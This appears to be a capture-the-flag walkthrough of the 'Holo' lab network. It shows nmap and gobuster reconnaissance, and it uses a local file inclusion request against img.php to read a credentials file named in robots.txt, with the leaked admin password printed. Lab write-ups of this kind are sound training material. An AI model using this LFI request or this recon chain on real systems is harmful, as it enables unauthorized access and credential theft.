# Holo Walkthrough

Scope: 10.200.112.0/24 and 192.168.100.0/24.

### Nmap:
```bash
└─$ nmap -sV -sC -p- -v 10.200.112.0/24
Scanning 2 hosts [65535 ports/host]
Discovered open port 22/tcp on 10.200.112.250
Discovered open port 1337/tcp on 10.200.112.250
Discovered open port 22/tcp on 10.200.112.33
Discovered open port 80/tcp on 10.200.112.33
Discovered open port 33060/tcp on 10.200.112.33
```

```bash
└─$ nmap -sV -sC -p 22,80,1337,33060 -A -v 10.200.112.33 10.200.112.250

Nmap scan report for holo.live (10.200.112.33)
Host is up (0.11s latency).

PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1d:bc:c0:2b:9e:98:ed:97:90:da:45:d5:8e:de:a1:7a (RSA)
|   256 91:f5:04:d5:6c:46:52:9a:9d:9e:7d:6b:b6:8d:59:2f (ECDSA)
|_  256 18:83:24:f6:fb:bc:be:5c:85:fb:9d:ea:2b:a6:ea:a4 (ED25519)
80/tcp    open   http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 21 disallowed entries (15 shown)
| /var/www/wordpress/index.php 
| /var/www/wordpress/readme.html /var/www/wordpress/wp-activate.php 
| /var/www/wordpress/wp-blog-header.php /var/www/wordpress/wp-config.php 
| /var/www/wordpress/wp-content /var/www/wordpress/wp-includes 
| /var/www/wordpress/wp-load.php /var/www/wordpress/wp-mail.php 
| /var/www/wordpress/wp-signup.php /var/www/wordpress/xmlrpc.php 
| /var/www/wordpress/license.txt /var/www/wordpress/upgrade 
|_/var/www/wordpress/wp-admin /var/www/wordpress/wp-comments-post.php
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://www.holo.live/
|_http-server-header: Apache/2.4.29 (Ubuntu)
1337/tcp  closed waste
33060/tcp open   mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000

Nmap scan report for 10.200.112.250
Host is up (0.11s latency).

PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 0f:6f:f4:97:a2:f1:7a:6a:9c:44:fe:e0:09:05:dd:c6 (RSA)
|   256 59:bd:f8:47:fc:1e:3a:2f:98:fd:84:5f:11:84:f1:84 (ECDSA)
|_  256 f4:cc:6c:f2:ca:dc:fa:74:68:eb:25:b7:f6:ac:09:de (ED25519)
80/tcp    closed http
1337/tcp  open   http    Node.js Express framework
|_http-title: Error
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
33060/tcp closed mysqlx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Vhost Enumertaion

```bash
└─$ gobuster vhost -u http://holo.live -w /usr/share/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt

Found: dev.holo.live
Found: admin.holo.live
```
- Found **robots.txt** on **admin.holo.live/robots.txt**
```text
User-agent: *
Disallow: /var/www/admin/db.php
Disallow: /var/www/admin/dashboard.php
Disallow: /var/www/admin/supersecretdir/creds.txt
```

- Navigate to **dev.holo.live** Found images under the Talents tab.
- On opening the image found that the `img.php` file is used to fetch images. Seems `LFI` vulnerability.
```url
http://dev.holo.live/img.php?file=images/korone.jpg
```
- Insert the file path of the credentials file we found in the **robots.txt** at **admin.holo.live/robots.txt**
```url
dev.holo.live/img.php?file=/var/www/admin/supersecretdir/creds.txt
```
- Got credentials successfully.
```text
I know you forget things, so I'm leaving this note for you:
admin:DBManagerLogin!
- gurag <3
```

